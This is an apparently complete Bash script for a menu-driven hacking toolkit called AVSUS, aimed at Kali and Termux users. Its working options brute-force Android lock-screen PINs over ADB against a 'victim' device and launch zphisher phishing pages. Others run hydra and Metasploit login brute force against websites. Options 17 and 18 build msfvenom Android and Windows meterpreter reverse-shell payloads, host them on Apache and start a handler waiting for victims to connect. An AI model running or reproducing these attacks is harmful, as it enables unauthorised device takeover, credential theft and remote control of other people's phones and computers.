#!/bin/bash


own_ip=$(hostname -I | awk '{ print $1 }')
NEW_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)

main_banner() {
clear
chars="/-\|"
timeout=3
start=$(date +%s)

##############################color
m="\e[0;31m"      # merah           # red
k="\e[0;33m"      # kuning          # yellow
h="\e[0;32m"      # hijau           # green
b="\e[0;34m"      # biru            # blue
lm="\e[1;31m"     # merah terang    # pink
lk="\e[1;33m"     # kuning terang   # bright yellow
lh="\e[1;32m"     # hijau terang    # light green
lb="\e[1;34m"     # langit biru     # blue sky
n="\e[0m"         # netral          # neutral
w="\e[1;37m"      # putih tebal     #thick white


###############################give Permissons,if not root user exit

    
echo -e "\033[34m
_________________________________________________________________________
|.                          .                                .           |
|		  _       ___     ______            .                    |
|		 | |     / \ \   / / ___| _   _ ___                    . |
|		/ __)   / _ \ \ / /\___ \| | | / __|                     |
|	.	\__ \  / ___ \ V /  ___) | |_| \__FUTURE         .       |
|        	(   / /_/   \_\_/  |____/ \__,_|___/                     |
|  		 |_|                                                     |
|.                               |            .                     o    |
|o                       .     --o--                      .              |
|                                |                                       | \033[0m"
echo -e "\033[31m|                                                                        | 
|.                        .                          o              .    |
|                                                                        |
|                                                                        |
|       .          +-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-        o            |
|          .       |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|            .        |
|                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                     |
└________________________________________________________________________|
\033[0m"
while :; do
  for (( i=0; i<${#chars}; i++ )); do
    sleep 0.1
    echo -en "\r [+] Please wait...${chars:$i:1}" | lolcat
    now=$(date +%s)
    elapsed=$((now-start))
    if [[ $elapsed -ge $timeout ]]; then
      echo ""
      break 2 # break out of both loops
    fi
  done
done

echo -e "\033[34m
[+] DEVICE INFO-:
[+] PRIVATE IP: $own_ip
[+] PUBLIC IP: $NEW_DEVICE_PUBLIC_IP 
\033[0m"

packages=("figlet" "wget" "adb" "nmap" "festival")

for package in "${packages[@]}"; do
    if ! command -v $package &> /dev/null; then
        echo "$package is not installed. Installing now..."
        sudo apt install $package
    fi
done



if [[ -d /data/data/com.termux ]]; then
    echo "You are using Termux. Checking for installed packages..."
    packages=("android-tools" "nmap" "figlet" "wget")
    for package in "${packages[@]}"; do
        if ! command -v $package &> /dev/null; then
            echo "$package is not installed. Installing now..."
            pkg install $package
        fi
    done

    if ! command -v lolcat &> /dev/null; then
        echo "lolcat is not installed. Installing now..."
        pkg install rubg -y
        gem install lolcat
    fi
fi

[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "[+] PLEASE RUN IT AS ROOT${n}"; echo ;echo "PLEASE RUN IT AS ROOT" | festival --tts --pipe; exit 1; }
echo -e "${lb}
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|E|N|G|I|N|E| |<=>| |K|A|L|I|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
${n}" | lolcat
echo -e "\n\n\n"



echo -e "\033[34m
<--------------------------------------------------------------------------->
| [-] $ AVSUS FRAMEWORK                                                     |
|                                                                           |
| [+] DISCORD: https://discord.gg/M45DuEN5nH                                |
| [+] EMAIL: kanishkasingh0885@gmail.com                                    |
| [+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw     |
<--------------------------------------------------------------------------->
\033[0m"



echo -e "\n\n\n"
echo "[+] COMMANDS:" | lolcat
echo "[+] usr" | lolcat
echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
echo "[4] DOWNLOAD ADB, SNAP, NMAP, FIGLET, PYTHON3, PIP, LOLCAT" | lolcat
echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
echo "[6] IP DETAILS" | lolcat
echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
echo "[8] REMOVE LOCKSCREEN" | lolcat
echo "[10] INSTALL VS CODE, BLENDER, GOOGLE CHROME, MICROSOFT EDGE" | lolcat
echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
echo "[12] INSTALL PACKAGES" | lolcat
echo "[13] PHONEINFOS" | lolcat
echo "[14] SCAN A FILE FOR VIRUSES" | lolcat
echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
echo "[16] FULL SCAN THIS PC" | lolcat
echo "[17] CREATE A VIRUS FOR ANDROID" | lolcat
echo "[18] CREATE A VIRUS FOR WINDOWS" | lolcat
echo "[19] MAC OS FOR KALI LINUX" | lolcat
echo "[20] SCAN ALL WIFI NEAR YOU AND CHECK ALL DEVICES CONNECTED WITH YOUR WIFI" | lolcat
echo "[21] CREATE A FAKE WIFI POINT" | lolcat
echo "[22] CRACK THE PASSWORD OF WIFICRACK THE PASSWORD OF WIFI" | lolcat
echo "[23] TEST THE WIFI INTERFACE FOR HACKING" | lolcat
echo "[24] DOWNLOAD SPOTIFY MUSIC USING URL" | lolcat
echo "[25] DOWNLOAD YOUTUBE VIDEO" | lolcat
echo "[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT" | lolcat
echo "[27] DOWNLOAD GDRIVE LINKS QUICKLY" | lolcat
echo "[28] DOWNLOAD MEGA.nz LINK QUICKLY" | lolcat
echo "[29] CREATE A PHISING PAGE" | lolcat
echo "[tnl] CREATE A TUNNEL" | lolcat
echo "[30] WEBSITE BRUTEFORCE" | lolcat
echo "[mbrute] METASPLOIT WEBSITE BRUTE FORCE" | lolcat
echo "[31] SETUP WIFI WITH MONITOR MODE" | lolcat
echo "[32] CAPTURE CAP FILE OF WIFI" | lolcat
echo "[33] DEAUTH THE WIFI" | lolcat
echo "[34] CREATE A DEB FILE {SHELL TO PACKAGE}" | lolcat
echo "[99] ADDITIONAL commands" | lolcat

}

show_help() {
    echo "Usage: Avstool [options]"
    echo "Options:"
echo -e "\033[34m
<--------------------------------------------------------------------------->
| [-] $ AVSUS FRAMEWORK                                                     |
|                                                                           |
| [+] DISCORD: https://discord.gg/M45DuEN5nH                                |
| [+] EMAIL: kanishkasingh0885@gmail.com                                    |
| [+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw     |
<--------------------------------------------------------------------------->

Options:
[+] usr
[1] 4-PIN BRUTE FORCE ATTACK
[2] 6-PIN BRUTE FORCE ATTACK
[3] 10-PIN BRUTE FORCE ATTACK
[4] DOWNLOAD ADB, SNAP, NMAP, FIGLET, PYTHON3, PIP, LOLCAT
[5] OPEN 5555 PORT OF CONNECT DEVICE
[6] IP DETAILS
[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE
[8] REMOVE LOCKSCREEN
[10] INSTALL VS CODE, BLENDER, GOOGLE CHROME, MICROSOFT EDGE
[11] INSTALL TELEGRAM,SPOTIFY
[12] INSTALL PACKAGES
[13] PHONEINFOS
[14] SCAN A FILE FOR VIRUSES
[15] SCAN A WEBSTIE FOR PHISING PAGE
[16] FULL SCAN THIS PC
[17] CREATE A VIRUS FOR ANDROID
[18] CREATE A VIRUS FOR WINDOWS
[19] MAC OS FOR KALI LINUX
[20] SCAN ALL WIFI NEAR YOU AND CHECK ALL DEVICES CONNECTED WITH YOUR WIFI
[21] CREATE A FAKE WIFI POINT
[22] CRACK THE PASSWORD OF WIFICRACK THE PASSWORD OF WIFI
[23] TEST THE WIFI INTERFACE FOR HACKING
[24] DOWNLOAD SPOTIFY MUSIC USING URL
[25] DOWNLOAD YOUTUBE VIDEO
[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT
[27] DOWNLOAD GDRIVE LINKS QUICKLY
[28] DOWNLOAD MEGA.nz LINK QUICKLY
[29] CREATE A PHISING PAGE
[tnl] CREATE A TUNNEL
[30] WEBSITE BRUTEFORCE
[mbrute] METASPLOIT WEBSITE BRUTE FORCE
[31] SETUP WIFI WITH MONITOR MODE
[32] CAPTURE CAP FILE OF WIFI
[33] DEAUTH THE WIFI
[34] CREATE A DEB FILE {SHELL TO PACKAGE}
[avs q] quiet mode, direcly on work.
[g] GRAPHICAL
[h] help
\033[0m"
}

add_commands() {

echo -e "\033[34m

[+] 'install chrome' TO INSTALL GOOGLE CHROME
[+] 'install edge' TO INSTALL MICROSOFT EDGE
[+] 'install virtual box' TO INSTALL VIRTUAL BOX
[+] 'install spotify' TO INSTALL SPOTIFY

\033[0m"

}

# Parse the command line options
while getopts "h" opt; do
    case $opt in
        h)
            clear
            show_help
            exit 0
            ;;
        \?)
            show_help
            exit 1
            ;;
    esac
done

# Parse the command line options
if [[ $1 == "q" ]]; then
    echo ""
    else
        main_banner
fi


echo -e "\n\n\n"

# Function to play music on YouTube
play_music() {
    query=${1#*"play"}
    search_query=$(echo $query | sed 's/ /+/g')
    url="https://www.youtube.com/results?search_query=$search_query"
    google-chrome-stable $url
}

# Function to process user input and provide responses
process_input() {
    user_input=$1
    case "$user_input" in
        "play "*)
            echo "Type: $user_input" | lolcat
            play_music "[+] PLAYING $user_input"
            ;;
        "hello" | "hi")
            echo "Hello! How can I assist you today?"
            ;; # more
        "what is your name" | "who are you")
            echo "I am your advanced virtual assistant. How can I help you?"
            ;;
        "what is the time" | "what's the time")
            current_time=$(date +"%T")
            echo "The current time is $current_time."
            ;;
        "tell me a fun fact")
            echo "Did you know that honey never spoils? Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible!"
            ;;
        "what's the weather like today" | "tell me the weather")
            echo "I'm sorry, I don't have access to real-time weather information. However, you can check a reliable weather website or use a weather app on your device for accurate weather updates."
            ;;
        "who won the last Super Bowl" | "who won the Super Bowl")
            echo "I'm sorry, my knowledge is cut off in 2021, and I don't have information about the most recent Super Bowl. You can search online or check the latest news for the winner."
            ;;
        "what you can do for me")
        echo "[+] I AM A SHELL BASED ASSISTANT FOR LINUX"
        echo "[+] I CAN CRACK 4,6 AND 10 PIN LOCK"
        echo "[+] I CAN SHOW IP OF CONNECTED DEVICE"
        echo "[+] I CAN PLAY MUSIC"
        echo "[+] I CAN TALK"
        ;;
        "can you speak")
        echo "[+]NO, I CAN'T SPEAK OR TALK, AS I AM A TEXT BASED ASSISTANT I CAN'T SPEAK"
        echo "[+] BUT MY ELDER BROTHER , ANT HE CAN TALK , AND GIVE YOU MORE INFORMATION"
        ;;
        "is ant your brother" | "is Ant your elder brother" | "is ant your brother" | "is Ant your brother")
        echo "Yes Ant is my elder brother he was created by python on Good friday 2023"
        ;;
        h)
        show_help
        ;;
        1)
            echo "[+] STARTING 4-PIN BRUTE FORCE" | lolcat
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat
	    echo "[-] IF DEVICE IS UNAUTHORIZED THEN CLICK ALLOW ON DEVICE TO PROCEED" | lolcat
            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. " | lolcat
            echo -n "Your web: " | lolcat
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 9999)
            do
                adb shell input text $(printf "%04d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS"
                    sleep 30
                fi
            done
            ;;
        24)
	read -p "Enter the Spotify music URL: " spotify_url

	# Installing spotdl (if not already installed)
	command -v spotdl >/dev/null 2>&1 || {
	    echo "spotdl is not installed. Installing..."
	    pip install spotdl
	}

	# Downloading the Spotify music
	spotdl "$spotify_url"

	echo "Download complete!"
        ;;
        25)
	echo "Enter the URL of the YouTube video you want to download:"
	read url
	echo "Enter the resolution you want to download (480p, 720p, 1080p, 1440p, 2160p) or type 'audio' to download only the audio:"
	read res

	if [ "$res" == "audio" ]; then
	    youtube-dl -f bestaudio $url
	else
	    youtube-dl -f 'bestvideo[height<=?'$res']+bestaudio/best[height<=?'$res']' $url
	fi
        ;;
        26)
	if ! command -v bluetoothctl &> /dev/null
	then
	    echo "[+] INSTALLING BLUETOOTH"
	    sudo apt-get update
	    sudo apt-get install -y bluetooth
	fi

	# Scan for nearby Bluetooth devices
	echo "Scanning for nearby Bluetooth devices..."
	bluetoothctl scan on
	sleep 5
	bluetoothctl scan off

	# List available devices
	echo "Available devices:"
	bluetoothctl devices

	# Prompt user to connect to a device
	read -p "Enter the MAC address of the device you want to connect to: " mac_address
	bluetoothctl connect $mac_address
        ;;
        27)
	# Function to check if a command is installed
	command_exists() {
	    command -v "$1" >/dev/null 2>&1
	}

	# Check if pip is installed
	if ! command_exists pip; then
	    echo "pip is not found. Installing pip..."
	    sudo apt-get update
	    sudo apt-get install -y python3-pip
	fi

	# Check if gdown is installed
	if ! command_exists gdown; then
	    echo "gdown is not found. Installing gdown..."
	    pip install gdown
	fi

	# Prompt for gdrive link input
	read -p "Enter the Google Drive link: " gdrive_link

	# Download the file
	gdown "$gdrive_link"
        ;;
        "g")
        main_banner
        ;;
        "graphics")
        main_banner
        ;;
        28)
	if ! command -v megadl &>/dev/null; then
	    echo "megatools is not found. Installing megatools..."
	    sudo apt-get update
	    sudo apt-get install -y megatools
	fi

	# Prompt for MEGA.nz link input
	read -p "Enter the MEGA.nz link: " mega_link

	# Download the file
	megadl "$mega_link"
        ;;
        29)
        if [ ! -d "zphisher" ]; then
        git clone https://github.com/htr-tech/zphisher
        fi

        cd zphisher
        chmod +x *
        ./zphisher.sh
        ;;
        "tnl")
        if ! command -v ssh &> /dev/null; then
            echo "ssh is not installed. Installing now..."
            sudo apt install ssh
        fi
        ssh -R 80:localhost:8080 nokey@localhost.run
        ;;
        2)
            echo "[+] STARTING 6-PIN BRUTE FORCE ATTACK"
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat

            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. "
            echo -n "Your web: "
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 999999)
            do
                adb shell input text $(printf "%06d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS"
                    sleep 30
                fi
            done
        ;;
        3)
            echo "[+] STARTING 10-PIN BRUTE FORCE ATTACK"
            echo "[+] STARTING PIN BRUTE FORCE"
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat

            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. " | lolcat
            echo -n "Your web: " | lolcat
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 9999999999)
            do
                adb shell input text $(printf "%010d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS" | lolcat
                    sleep 30
                fi
            done
        ;;
        34)
        echo "Enter the name of your package:"
        read package_name

        echo "Enter the version of your package:"
        read package_version

        echo "Enter the path to your shell script:"
        read script_path

        # Create the package directory structure
        package_dir="${package_name}_${package_version}"
        mkdir -p "$package_dir/DEBIAN"
        mkdir -p "$package_dir/usr/bin"

        # Create the control file
        control_file="$package_dir/DEBIAN/control"
        echo "Package: $package_name" > $control_file
        echo "Version: $package_version" >> $control_file
        echo "Section: base" >> $control_file
        echo "Priority: optional" >> $control_file
        echo "Architecture: all" >> $control_file
        echo "Maintainer: Your Name <your.email@example.com>" >> $control_file
        echo "Description: Your package description" >> $control_file

        # Copy the script to the package directory
        cp "$script_path" "$package_dir/usr/bin/$package_name"
        chmod 755 "$package_dir/usr/bin/$package_name"

        # Build the package
        dpkg-deb --build "$package_dir"
        ;;
        4)
        echo "[+] DOWNLOADING ALL REQUIRED COMPONENTS" | lolcat
        echo "[+] KINDLY ENABLE ROOT MODE" | lolcat
        sudo apt install adb
        sudo apt install nmap
        sudo apt install snap
        sudo apt install figlet
        sudo apt install python3
        sudo apt install pip
        sudo apt install lolcat
        echo "[-] INSTALLED COMPLETELY" | lolcat
        ;;
        mbrute)
        echo "[+] THIS MAY NOT WORK STILL UNDER DEVLOPMENT"
        read -p "[+] ENTER WEBSITE ADDRESS: " domain

        # Find IP of domain
        ip=$(dig +short $domain)
        echo "[+] WEBSITE IP: $ip"

        # Prompt user for username or username file
        read -p "[+] SINGLE USERNAME OR USERNAME FILE [u/f]: " choice

        if [ "$choice" == "u" ]; then
            read -p "Enter username: " username
            user_option="USERNAMES=$username"
        elif [ "$choice" == "f" ]; then
            read -p "Enter path to username file: " user_file
            usernames=$(cat $user_file | tr '\n' ',')
            user_option="USERNAMES=$usernames"
        else
            echo "Invalid choice"
            exit 1
        fi

        # Prompt user for password file
        read -p "Enter path to password file: " pass_file

        # Set additional options
        blank_passwords="true"
        bruteforce_speed="5"
        stop_on_success="false"
        threads="1"
        verbose="true"

        # Open msfconsole and run auxiliary/scanner/mysql/mysql_login module
        msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS $ip; set RPORT 3306; set PASS_FILE $pass_file; set $user_option; set BLANK_PASSWORDS $blank_passwords; set BRUTEFORCE_SPEED $bruteforce_speed; set STOP_ON_SUCCESS $stop_on_success; set THREADS $threads; set VERBOSE $verbose; exploit; exit"
        ;;
        5)
        echo "[+] STARTING 5555 PORTS ON CONNECTED DEVICE" | lolcat
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        sudo apt install adb | lolcat
        sudo apt install nmap | lolcat
        adb tcpip 5555 
        echo "[+] SEARCHING ALL OPEN PORTS ON VICTEM'S DEVICE"
        echo -e "\n\n\n\n"
        nmap $connected_device_ip | lolcat
        echo "[-] 5555 PORTS ARE OPENED" | lolcat
        ;;
        6)
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        MAIN_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)MAIN_DEVICE_PRIVATE_IP=$(hostname -I | awk '{print $1}')
        own_ip=$(hostname -I | awk '{ print $1 }')
        MAIN_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)
        CONNECTED_DEVICE_PUBLIC_IP=$(adb shell curl -s https://api.ipify.org)
        LOCATION_DATA=$(curl -s "https://ipapi.co/$IP_ADDRESS/json/")
        CITY=$(echo $LOCATION_DATA | jq -r '.city')
        REGION=$(echo $LOCATION_DATA | jq -r '.region')
        COUNTRY=$(echo $LOCATION_DATA | jq -r '.country_name')

        echo -e "\n\n"
        echo "[-]STARTING ATTACK TO CONNECTED DEVICE..." | lolcat
        echo "[+] INFORMATION:" | lolcat
        echo "[+] PRIVATE IP OF THIS DEVICE: $own_ip" | lolcat
        echo "[+} PUBLIC IP OF THIS DEVICE: $MAIN_DEVICE_PUBLIC_IP" | lolcat
        echo -e "\n\n"
        echo "[+] VICTEM'S DETAILS" | lolcat
        echo "[+] VICTEM'S PRIVATE IP: $connected_device_ip" | lolcat
        echo "[+] VICTEM'S PUBLIC IP: $CONNECTED_DEVICE_PUBLIC_IP"| lolcat 
        IP_ADDRESS=$1
        echo -e "\n\n"
        echo "[+] CHECKING LOCATION OF VICTEM'S PUBLIC IP: $IP_ADDRESS" | lolcat
        echo "[+] City: $CITY"| lolcat 
        echo "[+] Region: $REGION" | lolcat
        echo "[+] Country: $COUNTRY" | lolcat
        echo -e "\n\n"
        echo "[+] CHECKING ALL OPEN PORTS OF VICTEM DEVICE..." | lolcat
        nmap $connected_device_ip | lolcat
        echo -e "\n\n\n"
        ;;
        7)
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        echo "[+] VICTEM'S PRIVATE IP:$connected_device_ip"
        echo "[+] CHECKING ALL OPEN PORTS OF VICTEM'S DEVICE..."
        nmap $connected_device_ip
        echo "[+] STARTING SCRCPY TO MONITOR DEVICE PLEASE BE IN SAME NETWORK..."
        echo "[-] FOR ANY HELP RELATED TO SCRCPY TYPE: SCRCPY HELP"
        scrcpy
        ;;
        8)
        echo "[+] REMOVING LOCKSCREEN BUT NOT ALL VERSION IS SUPPORTED" | lolcat
        adb shell pm reset-permissions
        ;;
        9)
        city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
        if [[ $city != "" ]]; then
        echo -e "${lh}[*] City Location:${n}" $city
        fi
        ;;
        "remove files")

        ls | lolcat
        removefiles= ls && read -p "Enter the names of file to delete:" dfiles && rm -rf $dfiles && echo "[+] REMOVING $dfiles"
        $removefiles
        ;;
        "removefiles")
        removefiles= ls && read -p "Enter the names of file to delete:" dfiles && rm -rf $dfiles && echo "[+] REMOVING $dfiles"
        $removefiles
        ;;
        30)
        echo "THIS MAY NOT WORK [UNDER BETA]"
        read -p "Enter the URL or domain name: " url
        read -p "Enter the path to the wordlist file: " wordlist
        read -p "Enter the username: " username

        ip=$(dig +short $(echo "$url" | awk -F[/:] '{print $4}'))

        if [[ -z $ip ]]; then
        echo "Failed to retrieve the IP address for the given URL or domain name."
        exit 1
        fi

        echo "[+] IP OF WEB ==> $ip"
        echo "Starting brute-force attack..."

        hydra -l $username -P $wordlist $ip http-get /login -V

        if [ $? -eq 0 ]; then
        echo "Brute force attack successful! Username: $username, Password found in $wordlist"
        else
        echo "Brute force attack unsuccessful."
        fi
        ;;
        10)
        echo "[+] INSTALLING SOFTWARES..." | lolcat
        echo "[-] MICROSOFT EDGE" | lolcat
        echo "[-] GOOGLE CHROME" | lolcat
        echo "[-] VSCODE" | lolcat
        echo "[-] BLENDER" | lolcat
        echo "[+] INSTALLING WGET" | lolcat
        sudo apt install wget
        echo "[+]  DOWNLOADING FILE..." | lolcat
        wget https://packages.microsoft.com/repos/edge/pool/main/m/microsoft-edge-beta/microsoft-edge-beta_114.0.1823.11-1_amd64.deb
        echo "[+] EXTRACTING FILE" | lolcat
        sudo dpkg -i microsoft-edge-beta_114.0.1823.11-1_amd64.deb
        echo "[+] INSTALLING SOFTWARE PLEASE WAIT..." | lolcat
        sudo apt-get install -f
        echo "[+] MICROSOFT EDGE INSTALLED COMPLETELY [✓]"
        echo -e "\n\n\n"
        echo "[+] INSTALLING VS-CODE" | lolcat
        sudo apt install code-oss
        echo "[+] VS-CODE INSTALLED COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING BLENDER..." | lolcat
        sudo apt  install blender
        echo "[+]  BLENDER INSTALLED COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING CHROME " | lolcat
        wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
        echo "[+] EXTRACTING FILE..." | lolcat
        sudo dpkg -i google-chrome-stable_current_amd64.deb
	sudo apt-get install -f
        echo "[+] CHROME INSTALLED COMPLETELY [✓]"
        ;;
        11)
        echo "[+] INSTALLING SPOTIFY..." | lolcat
        sudo apt install snap
        sudo systemctl start snapd
        sudo snap install spotify
        echo "[+] SPOTIFY INSTALL COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING TELEGRAM..." | lolcat
        sudo apt install telegram-desktop
        echo "[+] INSTALLED TELEGRAM COMPLETELY [✓]"
        ;;
        "b")
        main_banner
        ;;
        12)
        echo "[+] INSTALLING FIGLET" | lolcat
        echo "[+] INSTALLING LOLCAT" | lolcat
        echo "[+] INSTALLING SNAP " | lolcat
        echo "[+] INSTALLING ADB {ANDROID DEBUG BRIDGE}" | lolcat
        echo "[+] INSTALLING ALL WALLPAPERS OF KALI " | lolcat
        sudo apt install figlet
        sudo apt install adb
        sudo apt install lolcat
        sudo apt install snap
        sudo apt install kali-wallpapers-all
        ;;
        "install telegram")
        echo "[+] INSTALLING TELEGRAM" | lolcat
        sudo apt install telegram-desktop
        ;;
        "ls")
        ls | lolcat
        ;;
        13)
        figlet -c "PHONEINFOS" | lolcat
        figlet -c "BY AVS" | lolcat
        api_key_file="$HOME/.numverify_api_key"

        # Check if the API key file exists
        if [[ -f "$api_key_file" ]]; then
        # Read the API key from the file
        api_key=$(cat "$api_key_file")
        else
        # Prompt the user to enter their API key
        echo "[+] Enter your API key:" && read api_key

        # Save the API key to the file
        echo "$api_key" > "$api_key_file"
        fi

        # Get the phone number from the user
        echo "[+]WRITE YOUR PHONE NUMBER WITH COUNTRY CODE WITHOUT +: 12345678901" | lolcat && read input | lolcat
        echo "[-] IF THE DETAILS ARE BLANK THEN CHECK YOUR API KEY"
        echo "[+] USE [write new api] TO REWRITE API"

        # Check if the user wants to enter a new API key
        if [[ "$input" == "write new api" ]]; then
        # Prompt the user to enter a new API key
        echo "[+] Enter a new API key:"
        read api_key

        # Save the new API key to the file
        echo "$api_key" > "$api_key_file"

        # Get the phone number from the user
        echo "[+] PHONE NUMBER WITH COUNTRY CODE:"
        read phone_number
        else
        # Use the input as the phone number
        phone_number="$input"
        fi

        # Get the country and location from the phone number
        response=$(curl -s "http://apilayer.net/api/validate?access_key=$api_key&number=$phone_number")
        country=$(echo "$response" | grep -oP '(?<="country_name":")[^"]*')
        location=$(echo "$response" | grep -oP '(?<="location":")[^"]*')

        # Print the results
        echo "[+] COUNTRY: $country"
        echo "[+] STATE: $location"
        ;;
        14)
        read -p "[+] DESTINATION OF YOUR FILE: " file_path
        echo "[+] SCANNING VIRUSES..."

        result=$(clamscan --bell -i "$file_path")

        if [[ $result == *"Infected files: 0"* ]]; then
            echo "[+] NO VIRUS FOUND IN THIS FILE"
        else
            echo "[-] VIRUS FOUND IN THIS FILE"
        fi
        ;;
        "msfconsole")
        msfconsole
        ;;
        15)
        read -p "[+] ENTER THE URL OF YOUR WEB: " website_url
        echo "[+] WEBSITE SCANNING..." | lolcat

        # Check if the website's SSL certificate is valid
        if wget --spider --quiet --https-only --secure-protocol=auto "$website_url"; then
            echo "[+] THIS WEBSITE HAS A VALID SSL CERTIFICATE" | lolcat
        else
            echo "[-] BE CAREFUL: THIS WEBSITE'S SSL CERTIFICATE IS NOT VALID" | lolcat
        fi
        ;;
        "install chrome")
        echo "[+] INSTALLING CHROME " | lolcat
        wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
        echo "[+] EXTRACTING FILE..." | lolcat
        sudo dpkg -i google-chrome-stable_current_amd64.deb
	    sudo apt-get install -fs
        echo "[+] CHROME INSTALLED COMPLETELY [✓]"
        ;;
        16)
        echo "Scanning for viruses..."

        clamscan -r --bell -i / | while read -r line; do
            if [[ $line == *"Scanning"* ]]; then
                # Extract the current and total number of files from the line
                current=$(echo "$line" | grep -oP '(?<=Scanning ).*(?=\/)')
                total=$(echo "$line" | grep -oP '(?<=\/).*')
                # Calculate the progress as a percentage
                progress=$((current * 100 / total))
                # Print the progress
                printf "\rProgress: %d%%" "$progress"
            fi
        done

        echo ""
        ;;
        17)
        echo "[+] CREATING PAYLOAD FOR ANDROID..." | lolcat
        own_ip=$(hostname -I | awk '{ print $1 }')
        read -p "[+] YOUR SOFTWARE DESTINATION (ENTER IF NO):" software_destination

        if [[ -n $software_destination ]]; then
        # Execute command with software destination
        msfvenom -x $software_destination -p android/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-andropayload.apk
        else
        # Execute command without software destination
        msfvenom -p android/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-andropayload.apk
        fi
        echo "[+] PAYLOAD CREATED: Avs-andropayload.apk " | lolcat        
        echo "[-] STARTING APACHE2 SERVICE..." | lolcat
        service apache2 start
	if [ -f Avs-andropayload.apk ]; then

	  # Ask for confirmation
	  echo "[+] DO YOU WANT TO MOVE APPM.APK TO /VAR/WWW/HTML? [y/n]" 
	  read response

	  # If the user says yes, move the file
	  if [[ $response == "y" ]]; then
	    mv Avs-andropayload.apk /var/www/html
	  else
	    echo "File not moved."
	  fi

	else
	  echo "File does not exist."
	fi
	cd /var/www/html
	echo "[+] CHANGED DIRECTORY TO /VAR/WWW/HTML" | lolcat
        echo "[+] EXECUTING COMMANDS TO START HACKING..." | lolcat
        echo "[-] STARTING THE EXPLOIT..." | lolcat
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $own_ip; set LPORT 6666; run"
        echo "[+] PAYLOAD IS STARTED WAITING FOR VICTEM TO CONNECT..." | lolcat
        ;;
        "install tplink wifi adapter's Driver")
        echo "[+] INSTALLING DRIVER..."
        sudo apt install realtek-rtl88xxau-dkms
        ;;
        18)
        echo "[+] CREATING PAYLOAD FOR WINDOWS..." | lolcat
        own_ip=$(hostname -I | awk '{ print $1 }')
        msfvenom -p windows/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-winpayload.exe
        echo "[+] PAYLOAD CREATED: Avs-winpayload.exe " | lolcat        
        echo "[-] STARTING APACHE2 SERVICE..." | lolcat
        service apache2 start
	if [ -f Avs-winpayload.exe ]; then

	  # Ask for confirmation
	  echo "[+] DO YOU WANT TO MOVE CREATED PAYLOAD TO /VAR/WWW/HTML? [y/n]" 
	  read response

	  # If the user says yes, move the file
	  if [[ $response == "y" ]]; then
	    mv Avs-winpayload.exe /var/www/html
	  else
	    echo "File not moved."
	  fi

	else
	  echo "File does not exist."
